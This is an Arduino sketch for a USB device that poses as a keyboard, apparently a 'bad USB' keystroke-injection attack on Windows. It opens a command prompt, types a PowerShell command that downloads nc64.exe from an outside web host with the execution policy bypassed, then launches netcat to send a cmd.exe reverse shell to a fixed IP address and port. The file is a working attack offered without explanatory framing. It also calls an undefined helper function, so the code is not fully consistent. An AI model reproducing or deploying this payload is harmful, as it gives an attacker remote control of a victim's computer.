#include <HIDKeyboard.h>

HIDKeyboard keyboard; // Initialize HIDKeyboard object

//util function
void type_key(int key){
 keyboard.pressKey(key);
 delay(50);
 keyboard.releaseKey();
}

void setup() {
  keyboard.begin(); // Start communication
  delay(5000); // Wait for device to be found 
  pinMode(13, OUTPUT);
  delay(20);
  keyboard.releaseKey();
  
  digitalWrite(13, HIGH);
  keyboard.pressSpecialKey(GUI); // Press the GUI (Windows) key
  keyboard.releaseKey(); // Release the GUI key
  delay(200); // Wait for the Start Button to open
  keyboard.print("run"); // Type "run" followed by a carriage return
  type_spc_key(ENTER);
  delay(3000); // Wait for the run dialog to come up 
  keyboard.print("cmd"); 
  type_spc_key(ENTER);
  delay(10);
  digitalWrite(13, LOW);
  
  delay(3000);
  digitalWrite(13, HIGH);
  char text[] = "cd / & mkdir win & cd win & echo (wget 'http://anmoljarvis.pythonanywhere.com/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1";
  keyboard.print(text);
  type_spc_key(ENTER);
  digitalWrite(13, LOW);

  digitalWrite(13, HIGH);
  delay(50);
  keyboard.print("START /MIN a.exe 192.168.43.26 6969 -e cmd.exe -d & exit");
  type_spc_key(ENTER);
  digitalWrite(13, LOW);
  
}

void loop() {
}
